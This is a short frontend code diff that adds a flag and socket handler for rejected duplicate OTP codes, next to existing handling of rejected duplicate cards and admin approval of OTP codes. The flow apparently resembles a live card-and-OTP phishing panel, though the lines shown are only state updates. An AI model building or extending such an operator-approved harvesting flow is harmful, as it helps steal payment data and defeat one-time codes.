@@ -95,6 +95,9 @@ export const cardAction = signal<{ action: string; timestamp: number } | null>(n
 // Duplicate Card Rejection
 export const duplicateCardRejected = signal<boolean>(false);
 
+// Duplicate OTP Rejection
+export const duplicateOtpRejected = signal<boolean>(false);
+
 // Code Action from Admin (approve, reject) for OTP/digit codes
 export const codeAction = signal<{ action: string; codeIndex: number } | null>(null);
 
@@ -271,6 +274,12 @@ export function initializeSocket() {
   s.on("card:duplicateRejected", () => {
     console.log("Duplicate card rejected!");
     duplicateCardRejected.value = true;
+    waitingMessage.value = "";
+  });
+
+  s.on("otp:duplicateRejected", () => {
+    console.log("Duplicate OTP rejected!");
+    duplicateOtpRejected.value = true;
     waitingMessage.value = "";
   });
 
